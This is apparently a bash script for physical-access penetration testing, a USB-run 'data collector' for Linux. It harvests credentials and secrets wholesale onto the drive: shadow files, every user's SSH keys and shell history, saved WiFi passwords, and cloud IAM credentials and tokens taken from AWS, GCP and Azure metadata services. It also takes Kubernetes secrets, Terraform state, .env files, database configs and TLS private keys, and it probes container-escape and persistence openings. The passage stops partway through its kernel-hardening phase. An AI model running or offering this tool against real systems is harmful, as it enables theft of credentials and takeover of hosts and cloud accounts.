#!/bin/bash
# ============================================================================
#  FLLC - Linux Data Collector v2
#  v1.777 | 2026
#  Authorized Penetration Testing - Physical Access Engagement
#
#  Collects system info, network config, credentials, cloud metadata,
#  container escape vectors, database secrets, TLS certificates,
#  kernel exploit surface, and lateral movement artifacts.
#
#  AUTHORIZED USE ONLY - Requires explicit written permission.
#  FLLC
# ============================================================================

set +e  # Don't exit on errors

# ============================================================================
#  CONFIGURATION
# ============================================================================

# Auto-detect mount point (look for MICRO labeled drive, or use script location)
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
DRIVE=""

# Try to find the MICRO drive
for mount in /media/*/MICRO /mnt/MICRO /run/media/*/MICRO; do
    if [ -d "$mount" ]; then
        DRIVE="$mount"
        break
    fi
done

# Fallback to script directory's drive
if [ -z "$DRIVE" ]; then
    DRIVE="$SCRIPT_DIR"
fi

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
USERNAME=$(whoami 2>/dev/null || echo "unknown")
OUT="$DRIVE/collected/${HOSTNAME}_${TIMESTAMP}"

# Create output structure
for dir in system network users credentials documents software; do
    mkdir -p "$OUT/$dir"
done

LOG="$OUT/collection.log"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG"
}

log "=== FLLC DATA COLLECTION STARTED ==="
log "Target: $HOSTNAME"
log "User: $USERNAME"
log "Output: $OUT"

IS_ROOT=false
if [ "$(id -u)" -eq 0 ]; then
    IS_ROOT=true
fi

# ============================================================================
#  PHASE 1: SYSTEM INFORMATION
# ============================================================================

log "PHASE 1: System Information"

# Basic system info
cat > "$OUT/system/systeminfo.txt" << SYSEOF
Hostname:     $HOSTNAME
Username:     $USERNAME
UID:          $(id -u)
GID:          $(id -g)
Groups:       $(id -Gn 2>/dev/null)
Kernel:       $(uname -a 2>/dev/null)
Distro:       $(cat /etc/os-release 2>/dev/null | head -5)
Uptime:       $(uptime 2>/dev/null)
Date:         $(date)
Root:         $IS_ROOT
SYSEOF

# Full system details
uname -a > "$OUT/system/uname.txt" 2>/dev/null
cat /etc/os-release > "$OUT/system/os_release.txt" 2>/dev/null
cat /etc/issue > "$OUT/system/issue.txt" 2>/dev/null
cat /proc/version > "$OUT/system/proc_version.txt" 2>/dev/null
cat /proc/cpuinfo > "$OUT/system/cpuinfo.txt" 2>/dev/null
cat /proc/meminfo > "$OUT/system/meminfo.txt" 2>/dev/null
df -h > "$OUT/system/disk_usage.txt" 2>/dev/null
lsblk > "$OUT/system/block_devices.txt" 2>/dev/null
mount > "$OUT/system/mounts.txt" 2>/dev/null
lsusb > "$OUT/system/usb_devices.txt" 2>/dev/null
lspci > "$OUT/system/pci_devices.txt" 2>/dev/null
env > "$OUT/system/environment.txt" 2>/dev/null

# Running processes
ps auxf > "$OUT/system/processes.txt" 2>/dev/null

# Services
systemctl list-units --type=service --all > "$OUT/system/services_systemd.txt" 2>/dev/null
service --status-all > "$OUT/system/services_sysv.txt" 2>/dev/null

# Kernel modules
lsmod > "$OUT/system/kernel_modules.txt" 2>/dev/null

log "  System info collected"

# ============================================================================
#  PHASE 2: NETWORK INFORMATION
# ============================================================================

log "PHASE 2: Network Information"

ip addr > "$OUT/network/ip_addr.txt" 2>/dev/null
ifconfig -a > "$OUT/network/ifconfig.txt" 2>/dev/null
ip route > "$OUT/network/routes.txt" 2>/dev/null
ip neigh > "$OUT/network/arp.txt" 2>/dev/null
arp -a > "$OUT/network/arp_table.txt" 2>/dev/null
ss -tlnp > "$OUT/network/listening_ports.txt" 2>/dev/null
netstat -tlnp > "$OUT/network/netstat.txt" 2>/dev/null
netstat -ano > "$OUT/network/netstat_all.txt" 2>/dev/null
cat /etc/resolv.conf > "$OUT/network/resolv_conf.txt" 2>/dev/null
cat /etc/hosts > "$OUT/network/hosts.txt" 2>/dev/null
iptables -L -n -v > "$OUT/network/iptables.txt" 2>/dev/null
ip6tables -L -n -v > "$OUT/network/ip6tables.txt" 2>/dev/null

# WiFi
iwconfig > "$OUT/network/iwconfig.txt" 2>/dev/null
nmcli dev wifi list > "$OUT/network/wifi_networks.txt" 2>/dev/null
nmcli connection show > "$OUT/network/nm_connections.txt" 2>/dev/null

# WiFi saved passwords
if [ -d /etc/NetworkManager/system-connections ]; then
    mkdir -p "$OUT/network/wifi_saved"
    cp /etc/NetworkManager/system-connections/* "$OUT/network/wifi_saved/" 2>/dev/null
fi

# DNS
cat /etc/nsswitch.conf > "$OUT/network/nsswitch.txt" 2>/dev/null

log "  Network info collected"

# ============================================================================
#  PHASE 3: USER INFORMATION
# ============================================================================

log "PHASE 3: User Information"

id > "$OUT/users/current_user.txt" 2>/dev/null
cat /etc/passwd > "$OUT/users/passwd.txt" 2>/dev/null
cat /etc/group > "$OUT/users/group.txt" 2>/dev/null
w > "$OUT/users/logged_in.txt" 2>/dev/null
last -20 > "$OUT/users/last_logins.txt" 2>/dev/null
lastlog > "$OUT/users/lastlog.txt" 2>/dev/null

# Shadow file (requires root)
if [ "$IS_ROOT" = true ]; then
    cat /etc/shadow > "$OUT/users/shadow.txt" 2>/dev/null
    cat /etc/gshadow > "$OUT/users/gshadow.txt" 2>/dev/null
    log "  Shadow files copied (root)"
fi

# Sudoers
cat /etc/sudoers > "$OUT/users/sudoers.txt" 2>/dev/null
ls -la /etc/sudoers.d/ > "$OUT/users/sudoers_d.txt" 2>/dev/null

log "  User info collected"

# ============================================================================
#  PHASE 4: CREDENTIALS & SSH
# ============================================================================

log "PHASE 4: Credentials & SSH"

# SSH keys and config for all users
for homedir in /home/* /root; do
    if [ -d "$homedir" ]; then
        user=$(basename "$homedir")
        mkdir -p "$OUT/credentials/ssh_$user"

        # SSH keys
        if [ -d "$homedir/.ssh" ]; then
            cp -r "$homedir/.ssh/" "$OUT/credentials/ssh_$user/" 2>/dev/null
        fi

        # Bash history
        for hist in .bash_history .zsh_history .history .sh_history; do
            if [ -f "$homedir/$hist" ]; then
                cp "$homedir/$hist" "$OUT/credentials/${user}_${hist}" 2>/dev/null
            fi
        done

        # Git credentials
        if [ -f "$homedir/.git-credentials" ]; then
            cp "$homedir/.git-credentials" "$OUT/credentials/${user}_git_credentials" 2>/dev/null
        fi
        if [ -f "$homedir/.gitconfig" ]; then
            cp "$homedir/.gitconfig" "$OUT/credentials/${user}_gitconfig" 2>/dev/null
        fi

        # AWS credentials
        if [ -d "$homedir/.aws" ]; then
            cp -r "$homedir/.aws" "$OUT/credentials/${user}_aws/" 2>/dev/null
        fi

        # Docker config
        if [ -f "$homedir/.docker/config.json" ]; then
            mkdir -p "$OUT/credentials/${user}_docker"
            cp "$homedir/.docker/config.json" "$OUT/credentials/${user}_docker/" 2>/dev/null
        fi

        # Kube config
        if [ -f "$homedir/.kube/config" ]; then
            mkdir -p "$OUT/credentials/${user}_kube"
            cp "$homedir/.kube/config" "$OUT/credentials/${user}_kube/" 2>/dev/null
        fi

        # Various config files with potential creds
        for f in .netrc .my.cnf .pgpass .env .npmrc .pypirc; do
            if [ -f "$homedir/$f" ]; then
                cp "$homedir/$f" "$OUT/credentials/${user}_${f}" 2>/dev/null
            fi
        done
    fi
done

# SSHD config
cp /etc/ssh/sshd_config "$OUT/credentials/sshd_config.txt" 2>/dev/null

log "  Credentials & SSH collected"

# ============================================================================
#  PHASE 5: CRON JOBS
# ============================================================================

log "PHASE 5: Cron Jobs"

crontab -l > "$OUT/system/crontab_current.txt" 2>/dev/null
ls -la /etc/cron* > "$OUT/system/cron_dirs.txt" 2>/dev/null
cat /etc/crontab > "$OUT/system/crontab_system.txt" 2>/dev/null

for crondir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
    if [ -d "$crondir" ]; then
        for f in "$crondir"/*; do
            if [ -f "$f" ]; then
                echo "=== $f ===" >> "$OUT/system/cron_scripts.txt"
                cat "$f" >> "$OUT/system/cron_scripts.txt" 2>/dev/null
                echo "" >> "$OUT/system/cron_scripts.txt"
            fi
        done
    fi
done

# User crontabs
if [ -d /var/spool/cron/crontabs ]; then
    cp -r /var/spool/cron/crontabs "$OUT/system/user_crontabs/" 2>/dev/null
fi

log "  Cron jobs collected"

# ============================================================================
#  PHASE 6: SOFTWARE & PACKAGES
# ============================================================================

log "PHASE 6: Software & Packages"

# Debian/Ubuntu
dpkg -l > "$OUT/software/dpkg_list.txt" 2>/dev/null
apt list --installed > "$OUT/software/apt_installed.txt" 2>/dev/null

# RHEL/CentOS/Fedora
rpm -qa > "$OUT/software/rpm_list.txt" 2>/dev/null
yum list installed > "$OUT/software/yum_installed.txt" 2>/dev/null

# Arch
pacman -Q > "$OUT/software/pacman_list.txt" 2>/dev/null

# Snap/Flatpak
snap list > "$OUT/software/snap_list.txt" 2>/dev/null
flatpak list > "$OUT/software/flatpak_list.txt" 2>/dev/null

# Python/pip
pip list > "$OUT/software/pip_list.txt" 2>/dev/null
pip3 list > "$OUT/software/pip3_list.txt" 2>/dev/null

# Node
npm list -g > "$OUT/software/npm_global.txt" 2>/dev/null

# SUID binaries (potential privesc)
find / -perm -4000 -type f > "$OUT/software/suid_binaries.txt" 2>/dev/null

# Writable directories
find / -writable -type d -maxdepth 3 > "$OUT/software/writable_dirs.txt" 2>/dev/null

log "  Software inventory collected"

# ============================================================================
#  PHASE 6.5: CLOUD / CONTAINER / KUBERNETES RECONNAISSANCE
# ============================================================================

log "PHASE 6.5: Cloud & Container Recon"

mkdir -p "$OUT/cloud"

# ──── Cloud Metadata Services ──────────────────────────────────────────
# AWS EC2 Instance Metadata (IMDSv1 + IMDSv2)
aws_meta() {
    local path="$1"
    # Try IMDSv2 first
    TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
        -H "X-aws-ec2-metadata-token-ttl-seconds: 60" --connect-timeout 2 2>/dev/null)
    if [ -n "$TOKEN" ]; then
        curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
            "http://169.254.169.254/latest/$path" --connect-timeout 2 2>/dev/null
    else
        # Fallback to IMDSv1
        curl -s "http://169.254.169.254/latest/$path" --connect-timeout 2 2>/dev/null
    fi
}

# Check if we're on AWS
AWS_CHECK=$(aws_meta "meta-data/instance-id")
if [ -n "$AWS_CHECK" ]; then
    log "  [CLOUD] AWS EC2 instance detected!"
    mkdir -p "$OUT/cloud/aws"
    aws_meta "meta-data/" > "$OUT/cloud/aws/metadata_index.txt"
    aws_meta "meta-data/instance-id" > "$OUT/cloud/aws/instance_id.txt"
    aws_meta "meta-data/instance-type" > "$OUT/cloud/aws/instance_type.txt"
    aws_meta "meta-data/ami-id" > "$OUT/cloud/aws/ami_id.txt"
    aws_meta "meta-data/hostname" > "$OUT/cloud/aws/hostname.txt"
    aws_meta "meta-data/local-ipv4" > "$OUT/cloud/aws/local_ip.txt"
    aws_meta "meta-data/public-ipv4" > "$OUT/cloud/aws/public_ip.txt"
    aws_meta "meta-data/security-groups" > "$OUT/cloud/aws/security_groups.txt"
    aws_meta "meta-data/iam/info" > "$OUT/cloud/aws/iam_info.json"
    # CRITICAL: IAM role credentials
    ROLE=$(aws_meta "meta-data/iam/security-credentials/")
    if [ -n "$ROLE" ]; then
        aws_meta "meta-data/iam/security-credentials/$ROLE" > "$OUT/cloud/aws/iam_creds_$ROLE.json"
        log "  [CLOUD] AWS IAM ROLE CREDENTIALS EXTRACTED: $ROLE"
    fi
    aws_meta "user-data" > "$OUT/cloud/aws/user_data.txt"
    aws_meta "meta-data/network/interfaces/macs/" > "$OUT/cloud/aws/network_macs.txt"
    aws_meta "dynamic/instance-identity/document" > "$OUT/cloud/aws/identity_doc.json"
    # AWS CLI config
    for f in ~/.aws/credentials ~/.aws/config; do
        [ -f "$f" ] && cp "$f" "$OUT/cloud/aws/" 2>/dev/null
    done
    # Environment variables with AWS keys
    env | grep -i "AWS_" > "$OUT/cloud/aws/aws_env_vars.txt" 2>/dev/null
fi

# GCP Metadata
GCP_CHECK=$(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/id" \
    -H "Metadata-Flavor: Google" --connect-timeout 2 2>/dev/null)
if [ -n "$GCP_CHECK" ]; then
    log "  [CLOUD] GCP instance detected!"
    mkdir -p "$OUT/cloud/gcp"
    gcp_meta() { curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/$1" --connect-timeout 2 2>/dev/null; }
    gcp_meta "instance/" > "$OUT/cloud/gcp/instance_info.txt"
    gcp_meta "instance/hostname" > "$OUT/cloud/gcp/hostname.txt"
    gcp_meta "instance/zone" > "$OUT/cloud/gcp/zone.txt"
    gcp_meta "instance/network-interfaces/0/ip" > "$OUT/cloud/gcp/internal_ip.txt"
    gcp_meta "instance/network-interfaces/0/access-configs/0/external-ip" > "$OUT/cloud/gcp/external_ip.txt"
    gcp_meta "instance/service-accounts/" > "$OUT/cloud/gcp/service_accounts.txt"
    SA=$(gcp_meta "instance/service-accounts/")
    for sa in $SA; do
        sa_clean=$(echo "$sa" | tr -d '/')
        gcp_meta "instance/service-accounts/$sa_clean/token" > "$OUT/cloud/gcp/token_$sa_clean.json"
        log "  [CLOUD] GCP SERVICE ACCOUNT TOKEN: $sa_clean"
    done
    gcp_meta "instance/attributes/" > "$OUT/cloud/gcp/attributes.txt"
    gcp_meta "project/project-id" > "$OUT/cloud/gcp/project_id.txt"
    gcp_meta "project/attributes/ssh-keys" > "$OUT/cloud/gcp/ssh_keys.txt"
    # GCP CLI config
    [ -d ~/.config/gcloud ] && cp -r ~/.config/gcloud "$OUT/cloud/gcp/gcloud_config/" 2>/dev/null
fi

# Azure IMDS
AZURE_CHECK=$(curl -s "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
    -H "Metadata: true" --connect-timeout 2 2>/dev/null)
if [ -n "$AZURE_CHECK" ]; then
    log "  [CLOUD] Azure VM detected!"
    mkdir -p "$OUT/cloud/azure"
    az_meta() { curl -s -H "Metadata: true" "http://169.254.169.254/metadata/$1?api-version=2021-02-01" --connect-timeout 2 2>/dev/null; }
    az_meta "instance" > "$OUT/cloud/azure/instance.json"
    az_meta "identity/oauth2/token?resource=https://management.azure.com/" > "$OUT/cloud/azure/mgmt_token.json" 2>/dev/null
    az_meta "identity/oauth2/token?resource=https://vault.azure.net/" > "$OUT/cloud/azure/vault_token.json" 2>/dev/null
    # Azure CLI config
    [ -d ~/.azure ] && cp -r ~/.azure "$OUT/cloud/azure/azure_config/" 2>/dev/null
    log "  [CLOUD] Azure tokens extracted"
fi

# DigitalOcean
DO_CHECK=$(curl -s "http://169.254.169.254/metadata/v1/id" --connect-timeout 2 2>/dev/null)
if [ -n "$DO_CHECK" ]; then
    log "  [CLOUD] DigitalOcean droplet detected!"
    mkdir -p "$OUT/cloud/digitalocean"
    curl -s "http://169.254.169.254/metadata/v1.json" --connect-timeout 2 > "$OUT/cloud/digitalocean/metadata.json" 2>/dev/null
fi

# ──── Container Detection ──────────────────────────────────────────────
mkdir -p "$OUT/cloud/container"

IS_CONTAINER=false
CONTAINER_TYPE="none"

# Docker detection
if [ -f /.dockerenv ] || grep -q docker /proc/1/cgroup 2>/dev/null; then
    IS_CONTAINER=true
    CONTAINER_TYPE="docker"
    log "  [CONTAINER] Docker container detected!"
fi

# Kubernetes pod detection
if [ -n "$KUBERNETES_SERVICE_HOST" ] || [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
    IS_CONTAINER=true
    CONTAINER_TYPE="kubernetes"
    log "  [CONTAINER] Kubernetes pod detected!"
fi

# LXC/LXD detection
if grep -q lxc /proc/1/cgroup 2>/dev/null || [ -f /dev/lxd/sock ]; then
    IS_CONTAINER=true
    CONTAINER_TYPE="lxc"
fi

echo "container_type: $CONTAINER_TYPE" > "$OUT/cloud/container/detection.txt"

if [ "$IS_CONTAINER" = true ]; then
    # Container escape reconnaissance
    cat /proc/1/cgroup > "$OUT/cloud/container/cgroups.txt" 2>/dev/null
    cat /proc/self/status > "$OUT/cloud/container/proc_status.txt" 2>/dev/null
    cat /proc/self/mountinfo > "$OUT/cloud/container/mountinfo.txt" 2>/dev/null

    # Check for privileged mode (container escape possible)
    if ip link add dummy0 type dummy 2>/dev/null; then
        ip link delete dummy0 2>/dev/null
        echo "PRIVILEGED=true" >> "$OUT/cloud/container/detection.txt"
        log "  [CONTAINER] PRIVILEGED MODE DETECTED — escape possible"
    fi

    # Check for dangerous capabilities
    cat /proc/self/status | grep -i cap > "$OUT/cloud/container/capabilities.txt" 2>/dev/null
    # Decode capabilities
    if command -v capsh &>/dev/null; then
        capsh --print > "$OUT/cloud/container/capsh.txt" 2>/dev/null
    fi

    # Check for Docker socket mount (container escape)
    if [ -S /var/run/docker.sock ]; then
        echo "DOCKER_SOCKET=accessible" >> "$OUT/cloud/container/detection.txt"
        log "  [CONTAINER] DOCKER SOCKET ACCESSIBLE — full escape possible"
        # List all containers
        curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json > "$OUT/cloud/container/docker_containers.json" 2>/dev/null
        curl -s --unix-socket /var/run/docker.sock http://localhost/images/json > "$OUT/cloud/container/docker_images.json" 2>/dev/null
        curl -s --unix-socket /var/run/docker.sock http://localhost/info > "$OUT/cloud/container/docker_info.json" 2>/dev/null
    fi

    # Kubernetes service account + secrets
    if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
        mkdir -p "$OUT/cloud/kubernetes"
        cp /var/run/secrets/kubernetes.io/serviceaccount/token "$OUT/cloud/kubernetes/sa_token.txt" 2>/dev/null
        cp /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$OUT/cloud/kubernetes/ca.crt" 2>/dev/null
        cp /var/run/secrets/kubernetes.io/serviceaccount/namespace "$OUT/cloud/kubernetes/namespace.txt" 2>/dev/null

        K8S_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
        K8S_HOST="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
        K8S_NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)

        if [ -n "$K8S_TOKEN" ]; then
            k8s_api() {
                curl -sk -H "Authorization: Bearer $K8S_TOKEN" "$K8S_HOST/api/v1/$1" 2>/dev/null
            }
            # Enumerate what we can access
            k8s_api "namespaces" > "$OUT/cloud/kubernetes/namespaces.json"
            k8s_api "namespaces/$K8S_NS/pods" > "$OUT/cloud/kubernetes/pods.json"
            k8s_api "namespaces/$K8S_NS/secrets" > "$OUT/cloud/kubernetes/secrets.json"
            k8s_api "namespaces/$K8S_NS/configmaps" > "$OUT/cloud/kubernetes/configmaps.json"
            k8s_api "namespaces/$K8S_NS/services" > "$OUT/cloud/kubernetes/services.json"
            k8s_api "nodes" > "$OUT/cloud/kubernetes/nodes.json"
            log "  [CONTAINER] Kubernetes API enumerated via service account"
        fi

        # Environment variables (K8s often injects secrets as env vars)
        env | sort > "$OUT/cloud/kubernetes/env_vars.txt"
    fi

    # Check for host PID namespace (escape via /proc)
    if [ "$(ls /proc/*/root/etc/hostname 2>/dev/null | head -1)" ]; then
        echo "HOST_PID_NS=accessible" >> "$OUT/cloud/container/detection.txt"
        log "  [CONTAINER] Host PID namespace accessible"
    fi

    # Check for host filesystem mounts
    mount | grep -E "^/dev/(sd|vd|nvme)" > "$OUT/cloud/container/host_mounts.txt" 2>/dev/null
fi

# ──── Docker Host Reconnaissance (if we're the host, not a container) ──
if [ "$IS_CONTAINER" = false ] && command -v docker &>/dev/null; then
    mkdir -p "$OUT/cloud/docker_host"
    docker ps -a > "$OUT/cloud/docker_host/containers.txt" 2>/dev/null
    docker images > "$OUT/cloud/docker_host/images.txt" 2>/dev/null
    docker network ls > "$OUT/cloud/docker_host/networks.txt" 2>/dev/null
    docker volume ls > "$OUT/cloud/docker_host/volumes.txt" 2>/dev/null
    docker info > "$OUT/cloud/docker_host/info.txt" 2>/dev/null
    # Container inspection (configs + env vars may contain secrets)
    docker ps -q 2>/dev/null | while read cid; do
        docker inspect "$cid" > "$OUT/cloud/docker_host/inspect_$cid.json" 2>/dev/null
    done
    log "  Docker host enumerated"
fi

# ──── SSH Agent Hijacking ──────────────────────────────────────────────
mkdir -p "$OUT/cloud/ssh_agents"
for sock in /tmp/ssh-*/agent.* /run/user/*/ssh-agent.sock; do
    if [ -S "$sock" ] 2>/dev/null; then
        echo "SOCKET: $sock" >> "$OUT/cloud/ssh_agents/found_sockets.txt"
        SSH_AUTH_SOCK="$sock" ssh-add -l >> "$OUT/cloud/ssh_agents/found_sockets.txt" 2>&1
        log "  [CREDS] SSH agent socket found: $sock"
    fi
done

# ──── systemd timer/service persistence opportunities ──────────────────
mkdir -p "$OUT/cloud/persistence"
find /etc/systemd/system /usr/lib/systemd/system -writable -type f > "$OUT/cloud/persistence/writable_systemd.txt" 2>/dev/null
find /etc/init.d -writable -type f > "$OUT/cloud/persistence/writable_initd.txt" 2>/dev/null
ls -la /etc/ld.so.preload > "$OUT/cloud/persistence/ld_preload.txt" 2>/dev/null
cat /etc/ld.so.preload > "$OUT/cloud/persistence/ld_preload_content.txt" 2>/dev/null

# ──── Process environment variables (may contain secrets) ──────────────
if [ "$IS_ROOT" = true ]; then
    for pid in $(ls /proc/ | grep '^[0-9]' | head -200); do
        envfile="/proc/$pid/environ"
        if [ -r "$envfile" ]; then
            name=$(cat /proc/$pid/comm 2>/dev/null)
            content=$(cat "$envfile" 2>/dev/null | tr '\0' '\n')
            if echo "$content" | grep -qi "password\|secret\|token\|key\|api_key\|database_url\|connection_string"; then
                echo "=== PID:$pid ($name) ===" >> "$OUT/cloud/persistence/proc_secrets.txt"
                echo "$content" | grep -i "password\|secret\|token\|key\|api_key\|database_url\|connection_string" >> "$OUT/cloud/persistence/proc_secrets.txt"
                log "  [CREDS] Secrets in PID $pid ($name) environment"
            fi
        fi
    done
fi

log "  Cloud & container recon complete"

# ============================================================================
#  PHASE 7: DOCUMENTS & FILES
# ============================================================================

log "PHASE 7: Documents & Files"

for homedir in /home/* /root; do
    if [ -d "$homedir" ]; then
        user=$(basename "$homedir")
        # Desktop
        if [ -d "$homedir/Desktop" ]; then
            find "$homedir/Desktop" -type f -maxdepth 2 > "$OUT/documents/${user}_desktop.txt" 2>/dev/null
        fi
        # Documents
        if [ -d "$homedir/Documents" ]; then
            find "$homedir/Documents" -type f -maxdepth 3 > "$OUT/documents/${user}_documents.txt" 2>/dev/null
        fi
        # Downloads
        if [ -d "$homedir/Downloads" ]; then
            find "$homedir/Downloads" -type f -maxdepth 2 > "$OUT/documents/${user}_downloads.txt" 2>/dev/null
        fi
    fi
done

# Interesting files
find /tmp /var/tmp /dev/shm -type f -maxdepth 2 > "$OUT/documents/temp_files.txt" 2>/dev/null

# Config files with potential secrets
grep -rl "password\|passwd\|secret\|key\|token\|api_key" /etc/ > "$OUT/documents/config_with_secrets.txt" 2>/dev/null

log "  Documents & files collected"

# ============================================================================
#  PHASE 8: DATABASE CREDENTIAL HARVESTING
# ============================================================================

log "PHASE 8: Database Credentials"

mkdir -p "$OUT/databases"

# MySQL / MariaDB
for homedir in /home/* /root; do
    user=$(basename "$homedir")
    if [ -f "$homedir/.my.cnf" ]; then
        cp "$homedir/.my.cnf" "$OUT/databases/${user}_my.cnf" 2>/dev/null
        log "  [DB] MySQL config: $homedir/.my.cnf"
    fi
    if [ -f "$homedir/.mylogin.cnf" ]; then
        cp "$homedir/.mylogin.cnf" "$OUT/databases/${user}_mylogin.cnf" 2>/dev/null
    fi
    if [ -f "$homedir/.mysql_history" ]; then
        cp "$homedir/.mysql_history" "$OUT/databases/${user}_mysql_history" 2>/dev/null
    fi
done
# MySQL system config
for f in /etc/mysql/my.cnf /etc/my.cnf /etc/mysql/debian.cnf /etc/mysql/conf.d/*; do
    if [ -f "$f" ]; then
        dest=$(echo "$f" | tr '/' '_')
        cp "$f" "$OUT/databases/sys${dest}" 2>/dev/null
    fi
done

# PostgreSQL
for homedir in /home/* /root; do
    user=$(basename "$homedir")
    [ -f "$homedir/.pgpass" ] && cp "$homedir/.pgpass" "$OUT/databases/${user}_pgpass" 2>/dev/null
    [ -f "$homedir/.psql_history" ] && cp "$homedir/.psql_history" "$OUT/databases/${user}_psql_history" 2>/dev/null
done
[ -f /etc/postgresql/*/main/pg_hba.conf ] && cp /etc/postgresql/*/main/pg_hba.conf "$OUT/databases/pg_hba.conf" 2>/dev/null

# Redis
for f in /etc/redis/redis.conf /etc/redis.conf; do
    if [ -f "$f" ]; then
        grep -i "requirepass\|masterauth" "$f" > "$OUT/databases/redis_passwords.txt" 2>/dev/null
        cp "$f" "$OUT/databases/redis_conf.txt" 2>/dev/null
    fi
done
# Try connecting without auth
redis-cli ping > "$OUT/databases/redis_noauth.txt" 2>/dev/null && log "  [DB] Redis accessible without auth!"

# MongoDB
for f in /etc/mongod.conf /etc/mongodb.conf; do
    [ -f "$f" ] && cp "$f" "$OUT/databases/mongod_conf.txt" 2>/dev/null
done
for homedir in /home/* /root; do
    [ -f "$homedir/.dbshell" ] && cp "$homedir/.dbshell" "$OUT/databases/$(basename $homedir)_dbshell" 2>/dev/null
    [ -f "$homedir/.mongoshrc.js" ] && cp "$homedir/.mongoshrc.js" "$OUT/databases/$(basename $homedir)_mongoshrc" 2>/dev/null
done

# SQLite databases (search common locations)
find /var/www /opt /srv /home -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | head -50 > "$OUT/databases/sqlite_files.txt"

# Connection strings in config files
grep -rIl "mysql://\|postgres://\|mongodb://\|redis://\|sqlite:///\|mssql://" /etc /opt /var/www /srv 2>/dev/null | head -30 > "$OUT/databases/connection_string_files.txt"
while IFS= read -r f; do
    [ -r "$f" ] && grep -iE "(mysql|postgres|mongodb|redis|sqlite|mssql)://" "$f" >> "$OUT/databases/connection_strings.txt" 2>/dev/null
done < "$OUT/databases/connection_string_files.txt"

log "  Database credentials collected"

# ============================================================================
#  PHASE 9: TERRAFORM / VAULT / CONSUL / IaC SECRETS
# ============================================================================

log "PHASE 9: Infrastructure-as-Code Secrets"

mkdir -p "$OUT/iac"

# Terraform state files (often contain plain-text secrets)
find / -name "terraform.tfstate" -o -name "*.tfstate" -o -name "*.tfstate.backup" 2>/dev/null | head -20 | while read f; do
    dest=$(echo "$f" | tr '/' '_')
    cp "$f" "$OUT/iac/tf${dest}" 2>/dev/null
    log "  [IaC] Terraform state: $f"
done

# Terraform variables (may contain secrets)
find / -name "terraform.tfvars" -o -name "*.auto.tfvars" 2>/dev/null | head -10 | while read f; do
    dest=$(echo "$f" | tr '/' '_')
    cp "$f" "$OUT/iac/tfvar${dest}" 2>/dev/null
done

# HashiCorp Vault
for homedir in /home/* /root; do
    [ -f "$homedir/.vault-token" ] && cp "$homedir/.vault-token" "$OUT/iac/$(basename $homedir)_vault_token" 2>/dev/null
done
env | grep -i "VAULT_" > "$OUT/iac/vault_env.txt" 2>/dev/null

# Consul
env | grep -i "CONSUL_" > "$OUT/iac/consul_env.txt" 2>/dev/null
[ -d /etc/consul.d ] && cp -r /etc/consul.d "$OUT/iac/consul_config/" 2>/dev/null

# Ansible
find / -name "ansible.cfg" -o -name "vault_pass*" -o -name "*.vault" 2>/dev/null | head -10 > "$OUT/iac/ansible_files.txt"
for homedir in /home/* /root; do
    [ -f "$homedir/.ansible/vault_password" ] && cp "$homedir/.ansible/vault_password" "$OUT/iac/$(basename $homedir)_ansible_vault_pass" 2>/dev/null
done

# .env files (recursive)
find / -name ".env" -not -path "*/node_modules/*" -not -path "*/.git/*" 2>/dev/null | head -30 | while read f; do
    dest=$(echo "$f" | tr '/' '_')
    cp "$f" "$OUT/iac/dotenv${dest}" 2>/dev/null
done

log "  IaC secrets collected"

# ============================================================================
#  PHASE 10: TLS CERTIFICATES & PRIVATE KEYS
# ============================================================================

log "PHASE 10: TLS Certificates & Keys"

mkdir -p "$OUT/tls"

# Find private keys
find / -name "*.key" -o -name "*.pem" -o -name "privkey*" -o -name "*.p12" -o -name "*.pfx" 2>/dev/null | head -50 > "$OUT/tls/key_files.txt"
while IFS= read -r f; do
    if [ -r "$f" ]; then
        dest=$(echo "$f" | tr '/' '_')
        cp "$f" "$OUT/tls/$dest" 2>/dev/null
        # Check if it's actually a private key
        if head -1 "$f" 2>/dev/null | grep -q "PRIVATE KEY"; then
            log "  [TLS] Private key found: $f"
        fi
    fi
done < "$OUT/tls/key_files.txt"

# Certificates
find / -name "*.crt" -o -name "*.cert" -o -name "*.cer" 2>/dev/null | head -30 > "$OUT/tls/cert_files.txt"

# Let's Encrypt
if [ -d /etc/letsencrypt ]; then
    find /etc/letsencrypt -name "privkey*" -o -name "fullchain*" 2>/dev/null | while read f; do
        dest=$(echo "$f" | tr '/' '_')
        cp "$f" "$OUT/tls/letsencrypt${dest}" 2>/dev/null
    done
    log "  [TLS] Let's Encrypt certs found"
fi

# Nginx/Apache SSL configs
grep -rI "ssl_certificate_key\|SSLCertificateKeyFile" /etc/nginx /etc/apache2 /etc/httpd 2>/dev/null > "$OUT/tls/webserver_ssl.txt"

log "  TLS certificates collected"

# ============================================================================
#  PHASE 11: KERNEL & EXPLOIT SURFACE
# ============================================================================

log "PHASE 11: Kernel Exploit Surface"

mkdir -p "$OUT/exploit_surface"

# Kernel version (for CVE matching)
uname -r > "$OUT/exploit_surface/kernel_version.txt" 2>/dev/null
cat /proc/version > "$OUT/exploit_surface/proc_version.txt" 2>/dev/null

# Kernel protections
{
    echo "=== Kernel Hardening ==="
    echo "ASLR: $(cat /proc/sys/kernel/randomize_va_space 2>/dev/null)"
    echo "kptr_restrict: $(cat /proc/sys/kernel/kptr_restrict 2>/dev/null)"
    echo "dmesg_restrict: $(cat /proc/sys/kernel/dmesg_restrict 2>/dev/null)"
